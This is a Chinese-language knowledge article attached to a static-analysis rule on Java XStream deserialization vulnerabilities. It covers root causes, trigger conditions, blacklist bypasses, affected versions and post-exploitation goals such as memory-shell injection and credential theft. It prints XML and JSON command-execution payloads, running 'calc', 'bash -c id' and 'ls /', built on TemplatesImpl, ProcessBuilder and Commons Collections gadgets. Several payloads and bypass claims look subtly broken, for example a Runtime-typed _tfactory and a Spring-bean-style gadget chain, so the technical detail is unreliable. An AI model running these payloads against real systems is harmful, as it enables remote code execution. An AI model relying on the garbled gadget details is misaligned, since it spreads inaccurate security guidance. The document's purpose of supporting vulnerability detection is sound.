# Java XStream 反序列化漏洞完整描述

> 规则 ID：`any_xstream_deserialization` · 类别：deser · 关键 sink：XStream, fromXML
> 说明：本条为语义知识（cypher 语义查询，不可直接挂 semgrep），下方「知识正文」为中文漏洞详解，
> 配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## Java XStream 反序列化漏洞完整描述
XStream 是一款 Java 序列化/反序列化工具，核心功能是将 Java 对象与 XML/JSON 等格式快速转换，因其易用性被广泛应用于数据传输、配置解析等场景。但 XStream 存在严重的反序列化漏洞，攻击者可通过构造恶意的 XML/JSON 数据，触发非预期的代码执行，进而控制目标系统。以下从漏洞根源、触发条件、不同场景下的漏洞表现及典型利用链展开说明。

## 一、漏洞核心根源
XStream 反序列化的核心风险在于其「无类型安全的反序列化机制」和「过度灵活的类型转换逻辑」：
1. **绕过类型校验**：XStream 默认允许反序列化任意类型的 Java 对象，即使是危险的系统类（如 `ProcessBuilder`、`Runtime`、`File` 等）；
2. **调用危险方法**：反序列化过程中，XStream 会自动调用对象的生命周期方法（如 `readResolve()`、`finalize()`）或通过反射实例化/执行类的方法，攻击者可利用这一点构造恶意调用链；
3. **原生序列化依赖**：XStream 底层对部分类型的处理依赖 Java 原生序列化（Java Serialization），而原生序列化本身存在大量已知的反序列化漏洞（如 Commons Collections、C3P0 等利用链），XStream 会继承这些风险。

## 二、漏洞触发的基础条件
触发 XStream 反序列化漏洞需满足以下核心条件：
1. 目标系统使用存在漏洞的 XStream 版本（不同版本漏洞覆盖范围不同，低版本几乎无防护）；
2. 应用程序调用 `XStream.fromXML()`/`XStream.fromJSON()` 等方法，处理**不可信的外部输入**（如 HTTP 请求体、文件、第三方接口返回数据）；
3. 未对 XStream 进行严格的类型白名单/黑名单限制，或限制规则可被绕过。

## 三、不同场景下的漏洞表现
### 场景1：基础类型直接利用（无依赖第三方库）
XStream 自身可通过 JDK 原生类构造利用链，无需依赖第三方库，是最基础且通用的漏洞形式。
#### 核心利用逻辑
攻击者构造包含 JDK 危险类的 XML/JSON 数据，XStream 反序列化时实例化这些类并触发代码执行。
#### 典型示例（ProcessBuilder 执行命令）
恶意 XML 示例：
```xml
<sorted-set>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>1</type>
    <value class="com.sun.org.apache.xpath.internal.objects.XString">
      <m__obj class="java.lang.ProcessBuilder">
        <command>
          <string>calc</string> <!-- Windows 弹出计算器，可替换为任意命令 -->
        </command>
      </m__obj>
      <m__isExternal>false</m__isExternal>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
  <comparator class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl">
    <_name>1</_name>
    <_bytecodes>yv66vgAAADQA...</_bytecodes> <!-- 恶意字节码，可替换命令执行逻辑 -->
    <_tfactory class="java.lang.Runtime">
      <runtime>java.lang.Runtime</runtime>
    </_tfactory>
    <_outputProperties></_outputProperties>
    <_indentNumber>0</_indentNumber>
  </comparator>
</sorted-set>
```
#### 触发原理
- `sorted-set`（`java.util.TreeSet`）的排序逻辑会调用 `comparator` 的 `compare` 方法；
- `TemplatesImpl` 类在 `compare` 执行时会加载 `_bytecodes` 中的恶意字节码，或通过 `ProcessBuilder` 直接执行系统命令；
- JDK 内置类（如 `Rdn_-RdnEntry`、`XString`）作为「载体」，绕过简单的类型检查。

### 场景2：依赖第三方库的利用链
当目标系统引入 Commons Collections、C3P0、Groovy 等第三方库时，攻击者可复用这些库的反序列化漏洞，结合 XStream 触发攻击，这类利用链覆盖范围更广。
#### 典型示例：Commons Collections 3.x 利用链
恶意 XML 核心片段：
```xml
<bean class="org.apache.commons.collections.map.LazyMap">
  <constructor-arg>
    <bean class="java.util.HashMap"/>
  </constructor-arg>
  <constructor-arg>
    <bean class="org.apache.commons.collections.functors.InvokerTransformer">
      <constructor-arg value="exec"/>
      <constructor-arg value="java.lang.Runtime"/>
      <constructor-arg>
        <array class="java.lang.String">
          <void>
            <string>bash</string>
            <string>-c</string>
            <string>id > /tmp/xstream_vuln</string>
          </void>
        </array>
      </constructor-arg>
    </bean>
  </constructor-arg>
</bean>
```
#### 触发原理
1. XStream 反序列化 `LazyMap` 时，会调用其 `get` 方法（内部逻辑触发）；
2. `LazyMap` 依赖 `InvokerTransformer` 执行反射调用，最终调用 `Runtime.exec()` 执行系统命令；
3. 该利用链仅需目标系统包含 Commons Collections 3.x 库，无需额外配置，是最经典的 XStream 漏洞利用方式。

### 场景3：XStream 版本防护绕过
XStream 官方曾通过「黑名单」修复部分漏洞，但攻击者可通过以下方式绕过防护：
#### 方式1：类名变形/别名绕过
XStream 支持「类别名」配置（如 `xstream.alias("user", User.class)`），攻击者可利用别名或类名的不同写法（如全限定名、内部类分隔符替换）绕过黑名单。
示例：若黑名单拦截 `java.lang.ProcessBuilder`，攻击者可使用 `javax.management.loading.MLet` 作为中间载体，间接调用 `ProcessBuilder`。

#### 方式2：利用未被拦截的 JDK 新类
JDK 版本迭代会新增类，部分新类可被用于构造新的利用链，而 XStream 黑名单未及时覆盖。例如：
- JDK 11+ 中的 `jdk.nashorn.api.scripting.NashornScriptEngine` 可执行 JavaScript 代码；
- JDK 8u20+ 中的 `com.sun.xml.internal.ws.client.sei.SEIStub` 可通过反射触发命令执行。

#### 方式3：嵌套类/内部类绕过
利用 Java 内部类（如 `java.lang.ProcessBuilder$Redirect`）作为载体，因黑名单通常仅拦截顶层类，内部类易被忽略，进而触发攻击。

### 场景4：JSON 格式反序列化漏洞
XStream 不仅支持 XML，也支持 JSON 反序列化（依赖 `xstream-json` 插件），漏洞原理与 XML 一致，但利用 payload 格式不同，易被防护规则遗漏（多数防护仅关注 XML 输入）。
#### 恶意 JSON 示例（执行命令）：
```json
{
  "java.util.TreeSet": {
    "comparator": {
      "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl": {
        "_bytecodes": "yv66vgAAADQA...",
        "_name": "exp",
        "_tfactory": {}
      }
    },
    "elements": [
      {
        "javax.naming.ldap.Rdn_-RdnEntry": {
          "type": "1",
          "value": {
            "com.sun.org.apache.xpath.internal.objects.XString": {
              "m__obj": {
                "java.lang.ProcessBuilder": {
                  "command": ["ls", "/"]
                }
              }
            }
          }
        }
      }
    ]
  }
}
```

### 场景5：特殊环境下的利用（无命令执行权限）
若目标系统无命令执行权限（如沙箱环境、权限严格的容器），攻击者仍可利用 XStream 漏洞实现其他攻击：
1. **文件操作**：通过 `java.io.File`、`java.nio.file.Files` 类读取/写入敏感文件（如 `/etc/passwd`、`application.properties`）；
2. **内存马注入**：若目标是 Web 应用（如 Spring Boot、Tomcat），可通过反序列化注入 Servlet 内存马，实现持久化控制；
3. **数据窃取**：反序列化过程中读取系统环境变量、JVM 内存中的敏感数据（如数据库密码、Token）。

## 四、漏洞影响范围
1. **版本覆盖**：XStream 1.4.18 及之前版本均存在严重漏洞，1.4.19+ 虽强化了白名单机制，但仍存在部分边缘场景的绕过可能；
2. **应用场景**：所有使用 XStream 处理外部输入的场景（如接口参数解析、配置文件加载、消息队列消费）均可能受影响；
3. **危害等级**：远程代码执行（RCE）为核心危害，其次是文件读写、数据窃取、拒绝服务（DoS）等。

## 五、漏洞触发的关键节点
XStream 反序列化过程中，以下步骤是漏洞触发的核心：
1. `XStream.fromXML()` 解析输入数据，调用 `Mapper` 接口解析类名；
2. 通过 `ReflectionProvider` 反射实例化目标类；
3. 调用类的 `set` 方法/构造函数赋值，或触发 `readResolve()` 等序列化回调方法；
4. 集合类（如 `TreeSet`、`LazyMap`）的内部逻辑（如排序、取值）触发危险方法执行。

综上，XStream 反序列化漏洞的本质是「无约束的类型实例化 + 生命周期方法/第三方库逻辑的恶意利用」，其攻击面广、利用方式灵活，且不同场景下的利用链可适配不同的目标环境，是 Java 生态中典型的高危漏洞类型。

